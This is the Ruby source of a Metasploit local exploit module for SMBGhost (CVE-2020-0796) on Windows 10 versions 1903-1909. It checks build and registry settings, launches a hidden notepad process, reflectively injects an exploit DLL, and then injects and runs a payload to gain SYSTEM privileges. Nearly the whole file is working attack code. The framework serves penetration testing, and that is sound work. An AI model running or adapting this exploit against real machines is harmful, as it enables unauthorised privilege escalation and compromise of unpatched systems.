#modules/exploits/windows/local/cve_2020_0796_smbghost.rb

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
#  include Msf::Exploit::Remote::AutoCheck

  def initialize(info={})
    super(update_info(info, {
      'Name'           => '',
      'Description'    => %q{
        A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to
        execute code on a vulnerable server. This local exploit implementation leverages this flaw to elevate itself
        before injecting a payload into winlogon.exe.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Daniel García Gutiérrez', # original LPE exploit
        'Manuel Blanco Parajón',   # original LPE exploit
        'Spencer McIntyre'         # metasploit module
      ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Targets'        =>
        [
          #[ 'Windows 10 x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows 10 v1903-1909 x64', { 'Arch' => ARCH_X64 } ]
        ],
      'Payload'         =>
        {
          'DisableNops' => true
        },
      'References'      =>
        [
          [ 'CVE', '2020-0796' ],
          [ 'URL', 'https://github.com/danigargu/CVE-2020-0796' ],
          [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/adv200005' ]
        ],
      'DisclosureDate' => '2020-03-13',
      'DefaultTarget'  => 0,
      'AKA'            => [ 'SMBGhost' ],
      'Notes'          =>
        {
          'Stability'   => [ CRASH_OS_RESTARTS, ],
          'Reliability' => [ REPEATABLE_SESSION, ],
        },
    }))
  end

  def check
    sysinfo_value = sysinfo["OS"]

    if sysinfo_value !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return Exploit::CheckCode::Safe
    end

    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Windows Build Number = #{build_num}")
    # see https://docs.microsoft.com/en-us/windows/release-information/
    unless sysinfo_value =~ /10/ && (build_num >= 18362 && build_num <= 18363)
      print_error('The exploit only supports Windows 10 versions 1903 - 1909')
      return CheckCode::Safe
    end

    disable_compression = registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters","DisableCompression")
    if !disable_compression.nil? && disable_compression != 0
      print_error('The exploit requires compression to be enabled')
      return CheckCode::Safe
    end

    return CheckCode::Appears
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo["Architecture"] == ARCH_X64 && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo["Architecture"] == ARCH_X86 && target.arch.first == ARCH_X64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Launching notepad to host the exploit...')
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-0796', 'CVE-2020-0796.x64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    encoded_payload = payload.encoded
    payload_mem = inject_into_process(process, [encoded_payload.length].pack('I<') + encoded_payload)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end
end